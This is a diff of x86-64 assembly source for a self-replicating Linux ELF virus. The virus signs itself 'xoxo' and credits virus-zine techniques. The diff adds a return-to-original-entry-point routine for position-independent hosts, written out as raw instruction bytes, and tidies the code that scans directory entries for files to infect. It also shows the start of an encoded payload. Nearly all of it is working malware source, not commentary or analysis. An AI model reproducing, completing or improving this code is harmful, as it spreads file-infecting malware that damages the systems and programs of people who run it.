@@ -107,6 +107,9 @@ BITS 64
 ; https://tmpout.sh/1/Linux.Nasty.asm
 ; [15] “Linux.Nasty.asm,” TMZ, 2021,
 ; https://www.guitmz.com/linux-nasty-elf-virus/ 
+; [16] Return To Original Entry Point Despite PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html
+; [17] S01den and Sblip, tmp.0ut, volume 1, https://tmpout.sh/1/Linux.Kropotkine.asm  
+; [18] anansi, sad0p, https://github.com/sad0p/anansi
 ;  
 ;*******************************************************************************
 ;section	.bss
@@ -214,12 +217,28 @@ BITS 64
 ; ...
 ; r14 + 144 end struc
 ;
-; instructions for returning to original host ELF entry point
+; ***Return to OEP instructions***
+; Instructions for returning to original entry point of PIE host ELF
 ; after conclusion of vx routines; appended to end of vx body
-; r14 + 150 = push (0x68)
-; r14 + 151 = dword XXXX 		address of original host entry point
-; r14 + 155 = ret (0xc3)
 
+; Shout to MalcolmVX for the guidance and help on figuring out the ret2oep routine 
+; References:
+;[16] Return To Original Entry Point Despite PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html
+;[17] S01den and Sblip, tmp.0ut, volume 1, https://tmpout.sh/1/Linux.Kropotkine.asm  
+;[18] anansi, sad0p, https://github.com/sad0p/anansi
+;
+;[r14 + 150] = 0xe8			;call get_rip
+;[r14 + 151] = 0x14			;at offset of 0x14 from curr instruction
+;[r14 + 155] = 0x2d48			;sub rax, vlen+5(length of get_rip instructions)
+;[r14 + 157] = vlen+5			
+;[r14 + 161] = 0x2d48			;sub rax, vxstart
+;[r14 + 163] = vxstart			
+;[r14 + 167] = 0x0548			;add rax, OEP
+;[r14 + 169] = OEP			
+;[r14 + 173] = 0xe0ff			;0xff 0xe0 = jump eax
+;[r14 + 175] = 0x24048b48		;mov rax, [rsp]; <- call get_rip
+;[r14 + 179] = 0xc3				;ret 
+		
 ;
 ; r14 + 200 = local filename (saved from dirent.d_nameq)
 ;
@@ -333,41 +352,8 @@ section .text
 global _start
 default rel
 _start:
-;	push rsp ;preserve rsp first since push will alter the value.
-;	push rbp
-;	push rax
-;	push rbx
-;	push rcx
-;	push rdx
-;	push rsi
-;	push rdi
-;	push r8
-;	push r9
-;	push r10
-;	push r11
-;	push r12
-;	push r13
-;	push r14
-;	push r15
 	jmp vxstart
-;	pop r15
-;	pop r14
-;	pop r13
-;	pop r12
-;	pop r11
-;	pop r10
-;	pop r9
-;	pop r8
-;	pop rdi
-;	pop rsi
-;	pop rdx
-;	pop rcx
-;	pop rbx
-;	pop rax
-;	pop rbp
-;	pop rsp
 	vxsig: db "xoxo",0
-
 vxstart:
 	push rsp ;preserve rsp first since push will alter the value.
 	push rbp
@@ -385,7 +371,6 @@ vxstart:
 	push r13
 	push r14
 	push r15
-	;push rbp
 	mov rbp, rsp
 	sub rsp, 0x2000
 	mov r14, rsp
@@ -478,7 +463,6 @@ check_file:
 		mov r8, rax
 		mov [r14 + 144], rax
 		xor r12, r12
-		;mov rsi, rdi
 		lea rdi, [r14 + 200] 
 		lea rsi, [rcx + r14 + 618]
 		.copy_filename:
@@ -599,7 +583,6 @@ check_file:
 		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
 		jne check_file
-		;jmp _restore
 	painting:
 	call payload
 		db 0x21,0x21,0x21,0x21,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x5b,0x5b,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x27,0x21,0x21,0x21,0x21,0x21,0x6f,0x6f,0x6f,0x6f
